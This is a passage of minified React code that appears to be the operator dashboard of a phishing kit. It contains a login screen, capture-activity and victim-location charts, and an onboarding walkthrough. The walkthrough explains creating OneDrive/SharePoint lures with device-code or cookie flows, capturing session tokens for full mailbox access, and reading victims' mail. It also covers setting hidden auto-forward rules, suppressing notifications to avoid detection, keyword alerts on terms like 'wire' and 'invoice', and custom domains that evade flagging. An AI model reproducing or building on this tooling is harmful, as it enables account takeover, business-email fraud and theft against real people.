                }),
                (0, R.jsx)(`path`, {
                  d: `M15.434 8H10v17h5.434A1.57 1.57 0 0 0 17 23.434V9.566A1.57 1.57 0 0 0 15.434 8Z`,
                  opacity: `.2`,
                }),
                (0, R.jsx)(`path`, {
                  d: `M15.434 8H10v15h5.434A1.57 1.57 0 0 0 17 21.434V9.566A1.57 1.57 0 0 0 15.434 8Z`,
                  opacity: `.2`,
                }),
                (0, R.jsx)(`path`, {
                  d: `M14.434 8H10v15h4.434A1.57 1.57 0 0 0 16 21.434V9.566A1.57 1.57 0 0 0 14.434 8Z`,
                  opacity: `.2`,
                }),
                (0, R.jsx)(`rect`, {
                  x: `2`,
                  y: `8`,
                  width: `14`,
                  height: `15`,
                  rx: `1.5`,
                  fill: `url(#ol)`,
                }),
                (0, R.jsx)(`path`, {
                  d: `M5.5 12.747a3.477 3.477 0 0 1 1.15-2.067A3.602 3.602 0 0 1 9.1 10c.58.006 1.15.14 1.67.39.5.26.93.64 1.25 1.11.34.51.51 1.1.5 1.7a3.79 3.79 0 0 1-.5 1.73 3.36 3.36 0 0 1-1.28 1.14 3.82 3.82 0 0 1-1.79.4 3.72 3.72 0 0 1-1.8-.41A3.16 3.16 0 0 1 5.9 13.9a3.74 3.74 0 0 1-.4-1.15Zm1.73.07c.04.41.16.8.37 1.16.17.3.43.55.74.72.32.17.68.26 1.04.25.38.01.75-.08 1.08-.26.31-.18.56-.44.72-.76.17-.35.26-.74.25-1.13a2.5 2.5 0 0 0-.25-1.13 1.78 1.78 0 0 0-.73-.77 2.05 2.05 0 0 0-1.08-.28 2.12 2.12 0 0 0-1.07.27c-.31.18-.56.44-.73.76a2.6 2.6 0 0 0-.34 1.17Z`,
                  fill: `#fff`,
                }),
                (0, R.jsx)(`defs`, {
                  children: (0, R.jsxs)(`linearGradient`, {
                    id: `ol`,
                    x1: `3.44`,
                    y1: `7.18`,
                    x2: `14.56`,
                    y2: `23.82`,
                    gradientUnits: `userSpaceOnUse`,
                    children: [
                      (0, R.jsx)(`stop`, { stopColor: `#0563C1` }),
                      (0, R.jsx)(`stop`, { offset: `1`, stopColor: `#0F6CBD` }),
                    ],
                  }),
                }),
              ],
            }),
            label: `Inbox`,
          }),
          (0, R.jsx)(Yi, {
            to: `/compose`,
            icon: (0, R.jsx)(Si, { size: 15, className: `text-[#38bdf8]` }),
            label: `B2B Sender`,
          }),
          (0, R.jsx)(Yi, {
            to: `/contacts`,
            icon: (0, R.jsx)(Er, { size: 15, className: `text-[#c084fc]` }),
            label: `Email Extractor`,
          }),
          (0, R.jsx)(Xi, { label: `Intel` }),
          (0, R.jsx)(Yi, {
            to: `/mfa`,
            icon: (0, R.jsx)(Ti, { size: 15, className: `text-[#f87171]` }),
            label: `Admin Control`,
          }),
          (0, R.jsx)(Yi, {
            to: `/keywords`,
            icon: (0, R.jsx)(Dr, { size: 15, className: `text-[#fbbf24]` }),
            label: `Keywords`,
          }),
          n === `admin` &&
            (0, R.jsx)(Yi, {
              to: `/ai`,
              icon: (0, R.jsx)(Ai, { size: 15, className: `text-[#c084fc]` }),
              label: `Help Center`,
            }),
          (0, R.jsx)(Xi, { label: `Tools` }),
          (0, R.jsx)(Yi, {
            to: `/domains`,
            icon: (0, R.jsx)($r, { size: 15, className: `text-[#2dd4bf]` }),
            label: `Domains`,
          }),
          (0, R.jsx)(Yi, {
            to: `/settings`,
            icon: (0, R.jsx)(Ci, { size: 15, className: `text-[#94a3b8]` }),
            label: `Settings`,
          }),
        ],
      }),
      (0, R.jsxs)(`div`, {
        className: `border-t border-border`,
        children: [
          (0, R.jsxs)(`button`, {
            onClick: a,
            className: `w-full flex items-center gap-3 px-4 py-2.5 text-[13px] text-text-muted hover:text-text transition-colors cursor-pointer`,
            children: [
              i === `dark`
                ? (0, R.jsx)(Ni, { size: 15, className: `text-[#fbbf24]` })
                : (0, R.jsx)(pi, { size: 15, className: `text-[#6366f1]` }),
              (0, R.jsx)(`span`, {
                children: i === `dark` ? `Light Mode` : `Dark Mode`,
              }),
            ],
          }),
          (0, R.jsxs)(`button`, {
            onClick: t,
            className: `w-full flex items-center gap-3 px-4 py-2.5 text-[13px] text-text-muted hover:text-danger transition-colors cursor-pointer`,
            children: [
              (0, R.jsx)(ui, { size: 15, className: `text-[#f87171]` }),
              (0, R.jsx)(`span`, { children: `Logout` }),
            ],
          }),
        ],
      }),
    ],
  });
}
var Qi = 0,
  z = $n((e) => ({
    toasts: [],
    add: (t, n = `info`) => {
      let r = ++Qi;
      (e((e) => ({ toasts: [...e.toasts, { id: r, message: t, type: n }] })),
        setTimeout(
          () => e((e) => ({ toasts: e.toasts.filter((e) => e.id !== r) })),
          3500,
        ));
    },
    remove: (t) => e((e) => ({ toasts: e.toasts.filter((e) => e.id !== t) })),
  })),
  $i = {
    success: `border-active text-active`,
    error: `border-danger text-danger`,
    info: `border-border-light text-text`,
  };
function ea() {
  let e = z((e) => e.toasts),
    t = z((e) => e.remove);
  return e.length
    ? (0, R.jsx)(`div`, {
        className: `fixed top-4 right-4 z-50 flex flex-col gap-2 max-w-sm`,
        children: e.map((e) =>
          (0, R.jsxs)(
            `div`,
            {
              className: `bg-surface border px-4 py-3 text-sm font-medium flex items-center gap-3 animate-[fadeIn_0.2s_ease] ${$i[e.type] ?? $i.info}`,
              children: [
                (0, R.jsx)(`span`, {
                  className: `flex-1`,
                  children: e.message,
                }),
                (0, R.jsx)(`button`, {
                  onClick: () => t(e.id),
                  className: `text-text-muted hover:text-text`,
                  children: (0, R.jsx)(Ki, { size: 14 }),
                }),
              ],
            },
            e.id,
          ),
        ),
      })
    : null;
}
var ta = [
  {
    icon: (0, R.jsx)(ai, { size: 32 }),
    title: `Create Lures`,
    desc: `Go to Lures and create phishing links. Choose a theme (OneDrive, SharePoint, etc.) and a flow type (device code, cookies, or both). Copy the URL and send it to your target.`,
  },
  {
    icon: (0, R.jsx)(ti, { size: 32 }),
    title: `Capture Tokens`,
    desc: `When a target authenticates, their token appears in the Token Vault. Active tokens give you full access to their mailbox, files, and more.`,
  },
  {
    icon: (0, R.jsx)(di, { size: 32 }),
    title: `Read Emails`,
    desc: `Click the inbox icon on any token to open Outlook View — a full email reader. You can browse folders, read messages, download attachments, and compose replies.`,
  },
  {
    icon: (0, R.jsx)(Ei, { size: 32 }),
    title: `Set Rules & Stealth`,
    desc: `Use Rules & Stealth to create auto-forward rules, suppress notifications, and stay hidden. This keeps your access persistent and undetected.`,
  },
  {
    icon: (0, R.jsx)(Dr, { size: 32 }),
    title: `Keyword Alerts`,
    desc: `Set up keyword alerts to get notified on Telegram when specific words appear in captured emails — like 'invoice', 'wire', 'payment', or 'password reset'.`,
  },
  {
    icon: (0, R.jsx)($r, { size: 32 }),
    title: `Domains & Marketplace`,
    desc: `Buy or link your own domains from the Domains page. Custom domains make your lures look more legitimate and harder to flag.`,
  },
];
function na({ onDismiss: e }) {
  let [t, n] = (0, _.useState)(0),
    r = ta[t],
    i = t === ta.length - 1;
  function a() {
    i ? e() : n((e) => e + 1);
  }
  return (0, R.jsx)(`div`, {
    className: `fixed inset-0 z-50 flex items-center justify-center bg-black/80`,
    children: (0, R.jsxs)(`div`, {
      className: `w-full max-w-lg mx-4 bg-surface border border-border`,
      children: [
        (0, R.jsxs)(`div`, {
          className: `flex items-center justify-between px-6 py-4 border-b border-border`,
          children: [
            (0, R.jsxs)(`div`, {
              children: [
                (0, R.jsx)(`h2`, {
                  className: `text-sm font-bold uppercase tracking-widest`,
                  children: `Welcome to the Panel`,
                }),
                (0, R.jsxs)(`p`, {
                  className: `text-[11px] text-text-muted mt-0.5`,
                  children: [`Quick walkthrough — `, t + 1, ` of `, ta.length],
                }),
              ],
            }),
            (0, R.jsx)(`button`, {
              onClick: e,
              className: `text-text-muted hover:text-text transition-colors cursor-pointer p-1`,
              children: (0, R.jsx)(Ki, { size: 18 }),
            }),
          ],
        }),
        (0, R.jsx)(`div`, {
          className: `h-px bg-border relative`,
          children: (0, R.jsx)(`div`, {
            className: `h-px bg-white transition-all duration-300`,
            style: { width: `${((t + 1) / ta.length) * 100}%` },
          }),
        }),
        (0, R.jsxs)(`div`, {
          className: `px-6 py-8 text-center`,
          children: [
            (0, R.jsx)(`div`, {
              className: `inline-flex items-center justify-center w-16 h-16 border border-border-light text-text-secondary mb-5`,
              children: r.icon,
            }),
            (0, R.jsx)(`h3`, {
              className: `text-base font-bold tracking-wide mb-3`,
              children: r.title,
            }),
            (0, R.jsx)(`p`, {
              className: `text-sm text-text-secondary leading-relaxed max-w-sm mx-auto`,
              children: r.desc,
            }),
          ],
        }),
        (0, R.jsx)(`div`, {
          className: `flex justify-center gap-1.5 pb-4`,
          children: ta.map((e, r) =>
            (0, R.jsx)(
              `button`,
              {
                onClick: () => n(r),
                className: `w-1.5 h-1.5 transition-all cursor-pointer ${r === t ? `bg-white w-4` : `bg-border-light hover:bg-text-muted`}`,
              },
              r,
            ),
          ),
        }),
        (0, R.jsxs)(`div`, {
          className: `flex items-center justify-between px-6 py-4 border-t border-border`,
          children: [
            (0, R.jsx)(`button`, {
              onClick: e,
              className: `text-xs text-text-muted hover:text-text transition-colors uppercase tracking-wider cursor-pointer`,
              children: `Skip`,
            }),
            (0, R.jsxs)(`div`, {
              className: `flex gap-2`,
              children: [
                t > 0 &&
                  (0, R.jsx)(`button`, {
                    onClick: () => n((e) => e - 1),
                    className: `px-4 py-2 text-xs font-semibold uppercase tracking-wider text-text-secondary border border-border hover:border-border-light transition-colors cursor-pointer`,
                    children: `Back`,
                  }),
                (0, R.jsxs)(`button`, {
                  onClick: a,
                  className: `px-5 py-2 text-xs font-bold uppercase tracking-wider bg-white text-black hover:bg-white/85 transition-colors flex items-center gap-1.5 cursor-pointer`,
                  children: [
                    i ? `Get Started` : `Next`,
                    (0, R.jsx)(Tr, { size: 13 }),
                  ],
                }),
              ],
            }),
          ],
        }),
      ],
    }),
  });
}
var ra = `panel_v2_welcomed`;
function ia() {
  let e = `${ra}_${er((e) => e.user)?.id ?? 0}`,
    [t, n] = (0, _.useState)(() => !localStorage.getItem(e));
  function r() {
    (localStorage.setItem(e, `1`), n(!1));
  }
  return (0, R.jsxs)(`div`, {
    className: `flex min-h-screen`,
    children: [
      (0, R.jsx)(Zi, {}),
      (0, R.jsx)(`main`, {
        className: `ml-[200px] flex-1 min-w-0 p-6`,
        children: (0, R.jsx)(It, {}),
      }),
      (0, R.jsx)(ea, {}),
      t && (0, R.jsx)(na, { onDismiss: r }),
    ],
  });
}
function aa() {
  let [e, t] = (0, _.useState)(``),
    [n, r] = (0, _.useState)(``),
    [i, a] = (0, _.useState)(``),
    [o, s] = (0, _.useState)(!1),
    [c, l] = (0, _.useState)(``),
    [u, d] = (0, _.useState)(!1),
    f = ct(),
    p = er((e) => e.setUser),
    m = rr((e) => e.branding),
    h = m.panel_name || `PANEL`,
    g = (0, _.useRef)(null);
  async function v(t) {
    (t.preventDefault(), l(``), d(!0));
    try {
      let t = await (
        await fetch(`/dash/auth`, {
          method: `POST`,
          credentials: `include`,
          headers: { "Content-Type": `application/json` },
          body: JSON.stringify({ username: e, password: n }),
        })
      ).json();
      if (t.needs_2fa) {
        (s(!0), d(!1), setTimeout(() => g.current?.focus(), 50));
        return;
      }
      t.success || t.ok
        ? (p(await ar()), f(`/`))
        : l(t.error || `Invalid username or password`);
    } catch {
      l(`Connection error. Try again.`);
    } finally {
      d(!1);
    }
  }
  async function y(e) {
    (e.preventDefault(), l(``), d(!0));
    try {
      let e = await (
        await fetch(`/dash/auth/2fa`, {
          method: `POST`,
          credentials: `include`,
          headers: { "Content-Type": `application/json` },
          body: JSON.stringify({ code: i }),
        })
      ).json();
      e.success || e.ok
        ? (p(await ar()), f(`/`))
        : (l(e.error || `Invalid code`), a(``));
    } catch {
      l(`Connection error. Try again.`);
    } finally {
      d(!1);
    }
  }
  return (0, R.jsx)(`div`, {
    className: `min-h-screen flex items-center justify-center bg-bg`,
    children: (0, R.jsxs)(`div`, {
      className: `w-full max-w-sm`,
      children: [
        (0, R.jsxs)(`div`, {
          className: `border border-border bg-surface`,
          children: [
            (0, R.jsxs)(`div`, {
              className: `px-8 pt-8 pb-2`,
              children: [
                m.panel_logo
                  ? (0, R.jsx)(`div`, {
                      className: `flex justify-center`,
                      children: (0, R.jsx)(`img`, {
                        src: m.panel_logo,
                        alt: h,
                        className: `h-8 max-w-[200px] object-contain`,
                      }),
                    })
                  : (0, R.jsx)(`h1`, {
                      className: `text-xl font-extrabold tracking-[0.3em] text-white text-center`,
                      children: h,
                    }),
                (0, R.jsx)(`p`, {
                  className: `text-center text-text-muted text-[11px] tracking-widest mt-1 uppercase`,
                  children: o ? `Enter your 2FA code` : `Sign in to continue`,
                }),
              ],
            }),
            o
              ? (0, R.jsxs)(`form`, {
                  onSubmit: y,
                  className: `px-8 pb-8 pt-6 space-y-4`,
                  children: [
                    c &&
                      (0, R.jsx)(`div`, {
                        className: `border border-danger/30 bg-danger/10 text-danger text-xs px-3 py-2`,
                        children: c,
                      }),
                    (0, R.jsxs)(`div`, {
                      children: [
                        (0, R.jsx)(`label`, {
                          className: `block text-[10px] text-text-muted uppercase tracking-widest mb-1.5`,
                          children: `Authentication Code`,
                        }),
                        (0, R.jsx)(`input`, {
                          ref: g,
                          type: `text`,
                          inputMode: `numeric`,
                          autoComplete: `one-time-code`,
                          maxLength: 6,
                          value: i,
                          onChange: (e) => a(e.target.value.replace(/\D/g, ``)),
                          className: `w-full bg-bg border border-border text-text px-3 py-2.5 text-sm text-center tracking-[0.5em] font-mono focus:outline-none focus:border-border-light transition-colors`,
                          placeholder: `000000`,
                          required: !0,
                        }),
                      ],
                    }),
                    (0, R.jsx)(`button`, {
                      type: `submit`,
                      disabled: u || i.length < 6,
                      className: `w-full bg-white text-black py-2.5 text-xs font-bold uppercase tracking-widest hover:bg-white/85 transition-colors disabled:opacity-40 cursor-pointer`,
                      children: u ? `Verifying...` : `Verify`,
                    }),
                    (0, R.jsx)(`button`, {
                      type: `button`,
                      onClick: () => {
                        (s(!1), l(``), a(``));
                      },
                      className: `w-full text-text-muted text-[10px] uppercase tracking-widest hover:text-text transition-colors cursor-pointer`,
                      children: `Back to login`,
                    }),
                  ],
                })
              : (0, R.jsxs)(`form`, {
                  onSubmit: v,
                  className: `px-8 pb-8 pt-6 space-y-4`,
                  children: [
                    c &&
                      (0, R.jsx)(`div`, {
                        className: `border border-danger/30 bg-danger/10 text-danger text-xs px-3 py-2`,
                        children: c,
                      }),
                    (0, R.jsxs)(`div`, {
                      children: [
                        (0, R.jsx)(`label`, {
                          className: `block text-[10px] text-text-muted uppercase tracking-widest mb-1.5`,
                          children: `Username`,
                        }),
                        (0, R.jsx)(`input`, {
                          type: `text`,
                          value: e,
                          onChange: (e) => t(e.target.value),
                          className: `w-full bg-bg border border-border text-text px-3 py-2.5 text-sm focus:outline-none focus:border-border-light transition-colors`,
                          autoFocus: !0,
                          required: !0,
                        }),
                      ],
                    }),
                    (0, R.jsxs)(`div`, {
                      children: [
                        (0, R.jsx)(`label`, {
                          className: `block text-[10px] text-text-muted uppercase tracking-widest mb-1.5`,
                          children: `Password`,
                        }),
                        (0, R.jsx)(`input`, {
                          type: `password`,
                          value: n,
                          onChange: (e) => r(e.target.value),
                          className: `w-full bg-bg border border-border text-text px-3 py-2.5 text-sm focus:outline-none focus:border-border-light transition-colors`,
                          required: !0,
                        }),
                      ],
                    }),
                    (0, R.jsx)(`button`, {
                      type: `submit`,
                      disabled: u,
                      className: `w-full bg-white text-black py-2.5 text-xs font-bold uppercase tracking-widest hover:bg-white/85 transition-colors disabled:opacity-40 cursor-pointer`,
                      children: u ? `Signing in...` : `Sign In`,
                    }),
                  ],
                }),
          ],
        }),
        (0, R.jsxs)(`div`, {
          className: `text-center mt-4 text-[10px] text-text-muted tracking-wider`,
          children: [
            (0, R.jsx)(`a`, {
              href: `/register`,
              className: `hover:text-text transition-colors`,
              children: `Create Account`,
            }),
            (0, R.jsx)(`span`, { className: `mx-2`, children: `|` }),
            (0, R.jsx)(`a`, {
              href: `/forgot-password`,
              className: `hover:text-text transition-colors`,
              children: `Forgot Password`,
            }),
          ],
        }),
      ],
    }),
  });
}
var oa = {
  default: `text-text`,
  active: `text-active`,
  danger: `text-danger`,
  warning: `text-warning`,
};
function B({ label: e, value: t, sub: n, accent: r = `default`, icon: i }) {
  return (0, R.jsxs)(`div`, {
    className: `bg-surface border border-border p-5 hover:border-border-light transition-colors`,
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center justify-between`,
        children: [
          (0, R.jsx)(`div`, {
            className: `text-3xl font-extrabold tracking-tight ${oa[r]}`,
            children: t,
          }),
          i && (0, R.jsx)(`div`, { children: i }),
        ],
      }),
      (0, R.jsx)(`div`, {
        className: `text-[10px] text-text-muted uppercase tracking-widest mt-1.5 font-bold`,
        children: e,
      }),
      n &&
        (0, R.jsx)(`div`, {
          className: `text-xs text-text-secondary mt-1`,
          children: n,
        }),
    ],
  });
}
var sa = {
    active: `bg-active/10 text-active border-active/25`,
    revoked: `bg-danger/10 text-danger border-danger/25`,
    suspended: `bg-warning/10 text-warning border-warning/25`,
    expired: `bg-warning/10 text-warning border-warning/25`,
    pending: `bg-info/10 text-info border-info/25`,
    default: `bg-surface text-text-secondary border-border-light`,
  },
  ca = {
    success: `bg-active/10 text-active border-active/25`,
    warning: `bg-warning/10 text-warning border-warning/25`,
    danger: `bg-danger/10 text-danger border-danger/25`,
    info: `bg-info/10 text-info border-info/25`,
    muted: `bg-surface text-text-secondary border-border-light`,
  };
function la({ status: e, label: t, color: n, children: r }) {
  return (0, R.jsx)(`span`, {
    className: `inline-block border px-2 py-0.5 text-[10px] font-bold uppercase tracking-wider ${n ? (ca[n] ?? ca.muted) : (sa[(e ?? ``).toLowerCase()] ?? sa.default)}`,
    children: r ?? t ?? e,
  });
}
var ua = [7, 14, 30];
function da(e, t) {
  let n = new Map(e.map((e) => [e.day, e.count])),
    r = [],
    i = new Date();
  for (let e = t - 1; e >= 0; e--) {
    let t = new Date(i);
    t.setDate(t.getDate() - e);
    let a = t.toISOString().slice(0, 10);
    r.push({ day: a, count: n.get(a) ?? 0 });
  }
  return r;
}
function fa(e) {
  return new Date(e + `T00:00:00`).toLocaleDateString(void 0, {
    month: `short`,
    day: `numeric`,
  });
}
function pa({ data: e }) {
  let [t, n] = (0, _.useState)(30),
    [r, i] = (0, _.useState)(null),
    a = (0, _.useMemo)(() => da(e, t), [e, t]),
    o = (0, _.useMemo)(() => Math.max(...a.map((e) => e.count), 1), [a]),
    s = (0, _.useMemo)(() => a.reduce((e, t) => e + t.count, 0), [a]),
    c = a.length,
    l = Array.from({ length: 4 }, (e, t) => Math.round((o / 4) * (4 - t))),
    u = s === 0;
  return (0, R.jsxs)(`div`, {
    className: `bg-surface border border-border`,
    children: [
      (0, R.jsxs)(`div`, {
        className: `flex items-center justify-between px-5 py-3 border-b border-border`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `flex items-center gap-3`,
            children: [
              (0, R.jsx)(`h3`, {
                className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
                children: `Capture Activity`,
              }),
              (0, R.jsxs)(`span`, {
                className: `text-[11px] text-text-muted font-medium tabular-nums`,
                children: [s.toLocaleString(), ` total`],
              }),
            ],
          }),
          (0, R.jsx)(`div`, {
            className: `flex gap-1`,
            children: ua.map((e) =>
              (0, R.jsxs)(
                `button`,
                {
                  onClick: () => n(e),
                  className: `text-[10px] font-bold uppercase tracking-wider px-2.5 py-1 transition-colors cursor-pointer ${t === e ? `text-text bg-white/[0.06]` : `text-text-muted hover:text-text-secondary`}`,
                  children: [e, `d`],
                },
                e,
              ),
            ),
          }),
        ],
      }),
      u
        ? (0, R.jsx)(`div`, {
            className: `text-sm text-text-muted py-16 text-center`,
            children: `No activity yet`,
          })
        : (0, R.jsxs)(`div`, {
            className: `px-5 py-4 relative`,
            children: [
              (0, R.jsxs)(`svg`, {
                viewBox: `0 0 100 212`,
                preserveAspectRatio: `none`,
                className: `w-full`,
                style: { height: `212px` },
                onMouseLeave: () => i(null),
                children: [
                  l.map((e, t) => {
                    let n = 184 - (e / o) * 160;
                    return (0, R.jsxs)(
                      `g`,
                      {
                        children: [
                          (0, R.jsx)(`line`, {
                            x1: 0,
                            x2: 100,
                            y1: n,
                            y2: n,
                            stroke: `var(--color-border)`,
                            strokeWidth: `0.15`,
                          }),
                          (0, R.jsx)(`text`, {
                            x: 100,
                            y: n - 1.5,
                            textAnchor: `end`,
                            fill: `var(--color-text-muted)`,
                            fontSize: `3`,
                            fontFamily: `inherit`,
                            children: e,
                          }),
                        ],
                      },
                      t,
                    );
                  }),
                  a.map((e, t) => {
                    let n = 100 / c - 2,
                      a = 0 + (100 / c) * t + 2 / 2,
                      s = (e.count / o) * 160,
                      l = 184 - s,
                      u = r === t;
                    return (0, R.jsxs)(
                      `g`,
                      {
                        onMouseEnter: () => i(t),
                        style: { cursor: `default` },
                        children: [
                          (0, R.jsx)(`rect`, {
                            x: a,
                            y: 24,
                            width: n,
                            height: 160,
                            fill: `transparent`,
                          }),
                          (0, R.jsx)(`rect`, {
                            x: a,
                            y: e.count > 0 ? l : 183.5,
                            width: n,
                            height: e.count > 0 ? s : 0.5,
                            rx: `0.3`,
                            fill:
                              e.count > 0
                                ? `var(--color-active)`
                                : `var(--color-border)`,
                            opacity: u ? 1 : e.count > 0 ? 0.65 : 0.3,
                            style: { transition: `opacity 0.1s` },
                          }),
                        ],
                      },
                      e.day,
                    );
                  }),
                  a.map((e, n) => {
                    if (n % (t <= 7 ? 1 : t <= 14 ? 2 : 5) != 0 && n !== c - 1)
                      return null;
                    let r = 100 / c;
                    return (0, R.jsx)(
                      `text`,
                      {
                        x: 0 + n * r + r / 2,
                        y: 208,
                        textAnchor: `middle`,
                        fill: `var(--color-text-muted)`,
                        fontSize: `2.8`,
                        fontFamily: `inherit`,
                        children: fa(e.day),
                      },
                      `label-${e.day}`,
                    );
                  }),
                ],
              }),
              r !== null &&
                a[r] &&
                (0, R.jsxs)(`div`, {
                  className: `absolute pointer-events-none bg-surface border border-border-light px-3 py-1.5 text-[11px] z-10 whitespace-nowrap`,
                  style: {
                    left: `${((r + 0.5) / c) * 100}%`,
                    top: `8px`,
                    transform: `translateX(-50%)`,
                  },
                  children: [
                    (0, R.jsx)(`span`, {
                      className: `text-text font-bold tabular-nums`,
                      children: a[r].count,
                    }),
                    ` `,
                    (0, R.jsx)(`span`, {
                      className: `text-text-muted`,
                      children: a[r].count === 1 ? `capture` : `captures`,
                    }),
                    (0, R.jsx)(`span`, {
                      className: `text-text-muted ml-1.5`,
                      children: fa(a[r].day),
                    }),
                  ],
                }),
            ],
          }),
    ],
  });
}
var ma = [
  `#22c55e`,
  `#3b82f6`,
  `#f59e0b`,
  `#ef4444`,
  `#8b5cf6`,
  `#ec4899`,
  `#06b6d4`,
  `#f97316`,
];
function ha(e) {
  let t = e.trim(),
    n = {
      US: `🇺🇸`,
      GB: `🇬🇧`,
      CA: `🇨🇦`,
      AU: `🇦🇺`,
      DE: `🇩🇪`,
      FR: `🇫🇷`,
      NL: `🇳🇱`,
      IN: `🇮🇳`,
      BR: `🇧🇷`,
      NG: `🇳🇬`,
      ZA: `🇿🇦`,
      KE: `🇰🇪`,
      GH: `🇬🇭`,
      AE: `🇦🇪`,
      SG: `🇸🇬`,
      JP: `🇯🇵`,
      KR: `🇰🇷`,
      MX: `🇲🇽`,
      IT: `🇮🇹`,
      ES: `🇪🇸`,
      PL: `🇵🇱`,
      SE: `🇸🇪`,
      NO: `🇳🇴`,
      DK: `🇩🇰`,
      FI: `🇫🇮`,
      IE: `🇮🇪`,
      PT: `🇵🇹`,
      PH: `🇵🇭`,
      ID: `🇮🇩`,
      TH: `🇹🇭`,
      PK: `🇵🇰`,
      EG: `🇪🇬`,
      SA: `🇸🇦`,
      TR: `🇹🇷`,
      RU: `🇷🇺`,
      CN: `🇨🇳`,
      HK: `🇭🇰`,
      TW: `🇹🇼`,
      MY: `🇲🇾`,
      VN: `🇻🇳`,
      CO: `🇨🇴`,
      AR: `🇦🇷`,
      CL: `🇨🇱`,
      NZ: `🇳🇿`,
      IL: `🇮🇱`,
      CZ: `🇨🇿`,
      AT: `🇦🇹`,
      CH: `🇨🇭`,
      BE: `🇧🇪`,
      RO: `🇷🇴`,
      UA: `🇺🇦`,
      GR: `🇬🇷`,
      HU: `🇭🇺`,
      SK: `🇸🇰`,
    };
  if (t.length === 2) return n[t.toUpperCase()] ?? `🌍`;
  for (let [e, r] of Object.entries(n))
    if (t.toLowerCase().includes(e.toLowerCase())) return r;
  return `🌍`;
}
function ga({ data: e }) {
  let [t, n] = (0, _.useState)(null),
    r = (0, _.useMemo)(() => {
      let t = [...e].sort((e, t) => t.count - e.count);
      if (t.length <= 8) return t;
      let n = t.slice(0, 7),
        r = t.slice(7).reduce((e, t) => e + t.count, 0);
      return [...n, { country: `Other`, count: r }];
    }, [e]),
    i = (0, _.useMemo)(() => r.reduce((e, t) => e + t.count, 0), [r]),
    a = (0, _.useMemo)(() => {
      let e = 0;
      return r.map((t, n) => {
        let r = i > 0 ? t.count / i : 0,
          a = { ...t, pct: r, offset: e, color: ma[n % ma.length] };
        return ((e += r), a);
      });
    }, [r, i]);
  if (e.length === 0)
    return (0, R.jsxs)(`div`, {
      className: `bg-surface border border-border`,
      children: [
        (0, R.jsx)(`div`, {
          className: `px-5 py-3 border-b border-border`,
          children: (0, R.jsx)(`h3`, {
            className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
            children: `Location Analytics`,
          }),
        }),
        (0, R.jsx)(`div`, {
          className: `text-sm text-text-muted py-16 text-center`,
          children: `No location data yet`,
        }),
      ],
    });
  let o = 2 * Math.PI * 40;
  return (0, R.jsxs)(`div`, {
    className: `bg-surface border border-border`,
    children: [
      (0, R.jsx)(`div`, {
        className: `px-5 py-3 border-b border-border`,
        children: (0, R.jsxs)(`div`, {
          className: `flex items-center justify-between`,
          children: [
            (0, R.jsx)(`h3`, {
              className: `text-xs font-bold uppercase tracking-wider text-text-muted`,
              children: `Location Analytics`,
            }),
            (0, R.jsxs)(`span`, {
              className: `text-[11px] text-text-muted font-medium tabular-nums`,
              children: [
                r.length,
                ` `,
                r.length === 1 ? `country` : `countries`,
              ],
            }),
          ],
        }),
      }),
      (0, R.jsxs)(`div`, {
        className: `flex items-center gap-6 px-5 py-5`,
        children: [
          (0, R.jsxs)(`div`, {
            className: `relative flex-shrink-0`,
            style: { width: 120, height: 120 },
            children: [
              (0, R.jsx)(`svg`, {
                viewBox: `0 0 100 100`,
                className: `w-full h-full -rotate-90`,
                children: a.map((e, r) => {
                  let i = e.pct * o,
                    a = o - i,
                    s = -e.offset * o,
                    c = t === r;
                  return (0, R.jsx)(
                    `circle`,
                    {
                      cx: 50,
                      cy: 50,
                      r: 40,
                      fill: `none`,
                      stroke: e.color,
                      strokeWidth: c ? 12 : 10,
                      strokeDasharray: `${i} ${a}`,
                      strokeDashoffset: s,
                      opacity: t !== null && !c ? 0.35 : 1,
                      style: {
                        transition: `opacity 0.15s, stroke-width 0.15s`,
                      },
                      onMouseEnter: () => n(r),
                      onMouseLeave: () => n(null),
                    },
                    e.country,
                  );
                }),
              }),
              (0, R.jsxs)(`div`, {
                className: `absolute inset-0 flex flex-col items-center justify-center`,
                children: [
                  (0, R.jsx)(`span`, {
                    className: `text-xl font-extrabold text-text tabular-nums`,
                    children: i.toLocaleString(),
                  }),
                  (0, R.jsx)(`span`, {
                    className: `text-[9px] text-text-muted uppercase tracking-widest font-bold`,
                    children: `Total`,
                  }),
                ],
              }),
            ],
          }),
          (0, R.jsx)(`div`, {
            className: `flex-1 min-w-0 space-y-1.5 max-h-[140px] overflow-y-auto`,
            children: a.map((e, r) =>
              (0, R.jsxs)(
                `div`,
                {
                  className: `flex items-center gap-2 text-[12px] py-0.5 px-1.5 rounded transition-colors cursor-default ${t === r ? `bg-white/[0.04]` : ``}`,
                  onMouseEnter: () => n(r),
                  onMouseLeave: () => n(null),
                  children: [
                    (0, R.jsx)(`span`, {
                      className: `w-2 h-2 rounded-full flex-shrink-0`,
                      style: { background: e.color },
                    }),
                    (0, R.jsxs)(`span`, {
                      className: `text-text-secondary truncate flex-1`,
                      children: [ha(e.country), ` `, e.country],
                    }),
                    (0, R.jsx)(`span`, {
                      className: `text-text font-bold tabular-nums flex-shrink-0`,
                      children: e.count,
                    }),
                    (0, R.jsxs)(`span`, {
                      className: `text-text-muted text-[10px] tabular-nums flex-shrink-0 w-8 text-right`,
                      children: [i > 0 ? Math.round(e.pct * 100) : 0, `%`],
                    }),
                  ],
                },
                e.country,
              ),
            ),
          }),
        ],
      }),
    ],
  });
}
async function _a() {
  return P(`/dash/stats`);
}
async function va() {
  return P(`/dash/overview`);
}
var ya = {
    primary: `bg-accent text-surface hover:opacity-85`,
    secondary: `bg-surface border border-border text-text-secondary hover:text-text hover:border-border-light`,
    danger: `bg-danger/15 text-danger border border-danger/30 hover:bg-danger/25`,
    ghost: `text-text-secondary hover:text-text hover:bg-surface`,
  },
  ba = { sm: `px-3 py-1.5 text-[11px]`, md: `px-4 py-2 text-xs` };
function V({
  variant: e = `primary`,
  size: t = `md`,
  children: n,
  className: r = ``,
  ...i
}) {
  return (0, R.jsx)(`button`, {
    className: `font-semibold uppercase tracking-wider cursor-pointer transition-all duration-150 disabled:opacity-40 disabled:cursor-not-allowed ${ya[e]} ${ba[t]} ${r}`,
    ...i,
    children: n,
  });
}
function H({ label: e, className: t = ``, ...n }) {
  return (0, R.jsxs)(`div`, {
    className: `w-full`,
    children: [
      e &&
        (0, R.jsx)(`label`, {
